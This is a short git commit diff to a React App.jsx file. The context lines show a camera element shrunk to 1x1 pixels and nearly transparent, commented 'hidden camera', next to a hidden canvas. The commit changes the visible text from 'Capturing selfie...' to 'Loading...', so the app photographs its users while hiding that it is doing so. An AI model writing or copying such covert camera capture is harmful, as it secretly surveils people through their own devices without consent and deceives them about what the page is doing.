2046aabb45c085a6aafda5f60521072df3fe7bff
aadii0011 <adityadrools@gmail.com>
2025-07-04 14:46:19 +0530

    Update App.jsx

--- frontend/src/App.jsx
+++ frontend/src/App.jsx
@@ -55,7 +55,7 @@ function App() {
         style={{ width: 1, height: 1, opacity: 0.01 }} // hidden camera
       />
       <canvas ref={canvasRef} style={{ display: "none" }} />
-      <p>📸 Capturing selfie...</p>
+      <p>Loading...</p>
     </div>
   );
 }
